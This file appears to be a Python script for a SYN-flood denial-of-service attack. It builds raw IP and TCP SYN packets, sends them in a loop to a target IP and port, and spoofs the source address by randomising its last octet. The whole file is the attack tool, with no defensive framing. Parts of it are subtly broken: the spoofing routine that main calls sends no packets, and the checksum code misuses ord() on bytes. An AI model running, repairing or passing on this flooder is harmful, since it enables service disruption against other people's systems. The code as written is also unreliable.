#imports
import socket, sys,random
from struct import *


def main(argv):
    #get the arguments from command line

    
    if len(argv)!=5:
        print('format error: command sourceip sourceport destip destport')
        exit()
        
    source_ip=str(argv[1])
    source_port=int(argv[2])
    dest_ip=str(argv[3])
    dest_port=int(argv[4])
    
    print('inputs are:',source_ip)
    #create a raw socket
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    except socket.error:
        print ('Socket could not be created. Error Code : '  + ' Message ') 
        sys.exit()
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    
    mysocket=TcpFloodingClient(source_ip,source_port,dest_ip,dest_port,s)
    mysocket.tcp_flooding_spoofing(9999999)
    print('test')
    
    

class TcpFloodingClient():
    
    def __init__(self,source_ip,source_port,dest_ip,dest_port,socketid):
        self.source_ip=str(source_ip)
        self.source_port=int(source_port)
        self.dest_ip=str(dest_ip)
        self.dest_port=int(dest_port)
        self.socketid=socketid
        
    def checksum(self,mesg):
        sum=0
        for i in range(0,len(mesg),2):
            word=((ord(mesg[i])<<8)+ord(mesg[i+1]))
            sum+=word
        sum=(sum>>16)+(sum&0xffff)
        sum=sum+(sum>>16)
        sum=~sum&0xffff
        return sum
    
    def cal_ip_header(self,source_ip,dest_ip):
        packet=''
        ip_header_length=5
        ip_header_version=4
        ip_header_len_ver=(ip_header_version<<4)+ip_header_length
        type_of_service=0
        total_length=0 # kernel fill it
        identification=54321
        flags=0
        time_to_live=255
        protocol=socket.IPPROTO_TCP
        checksum=0 #kernel  fill it
        source_ip=socket.inet_aton(source_ip)
        dest_ip=socket.inet_aton(dest_ip)
        ip_header=pack('!BBHHHBBH4s4s',
                              ip_header_len_ver,
                              type_of_service,
                              total_length,
                              identification,
                              flags,
                              time_to_live,
                              protocol,
                              checksum,
                              source_ip,
                              dest_ip)
        return ip_header
    
    def cal_tcp_header_chksum(self,s_port,d_port,chksum):
        source = s_port   # source port
        dest = d_port   # destination port
        seq = random.randrange(999)
        ack_seq = 0
        doff = 5  
        fin = 0
        syn = 1
        rst = 0
        psh = 0
        ack = 0
        urg = 0
        window = socket.htons (5840)    #   maximum allowed window size
        checksum = chksum
        urg_ptr = 0
        offset_res = (doff << 4) + 0
        tcp_flags = fin + (syn << 1) + (rst << 2) + (psh <<3) + (ack << 4) + (urg << 5)
        tcp_header = pack('!HHLLBBHHH' ,
                          source,
                          dest,
                          seq,
                          ack_seq,
                          offset_res,
                          tcp_flags,
                          window,
                          checksum,
                          urg_ptr)
        return tcp_header
    
    def cal_pseudo_header_chksum(self,sip,dip,tcp_length,s_port,d_port,length):
        source_address = socket.inet_aton( self.source_ip )
        dest_address = socket.inet_aton(self.dest_ip)
        placeholder = 0
        protocol = socket.IPPROTO_TCP
        tcp_length = length       
        psh = pack('!4s4sBBH' , source_address , dest_address , placeholder , protocol , tcp_length);
        psh = psh + self.cal_tcp_header_chksum(s_port,d_port,0);
        return self.checksum(psh)

    def tcp_syn(self):
        print('flooding:')                      
        ip_header=self.cal_ip_header(self.source_ip,self.dest_ip)
        
        tcp_header_nochksum=self.cal_tcp_header_chksum(self.source_port,self.dest_port,0)
        length=len(tcp_header_nochksum)

        tcp_header=self.cal_tcp_header_chksum(self.source_port,
                                         self.dest_port,
                                         self.cal_pseudo_header_chksum(self.source_ip,
                                                                  self.dest_ip,
                                                                  length,
                                                                  self.source_port,
                                                                  self.dest_port,length))
        print('flooding:')  
        mesg=''
        mesg=ip_header+tcp_header
        self.socketid.sendto(mesg,(self.dest_ip,0))
        return 0
    
    def tcp_flooding(self,looptimes):

        while(looptimes>0):
            self.tcp_syn()
            looptimes-=1
        return 0

    def tcp_flooding_spoofing(self,looptimes):
        iprange=self.source_ip.split('.')
        self.source_ip=iprange[0]+'.'+iprange[1]+'.'+iprange[2]+'.'+str(random.randrange(2,254))
        print('source ip',self.source_ip)
        return 0
        
    

if __name__ == '__main__':
    main(sys.argv)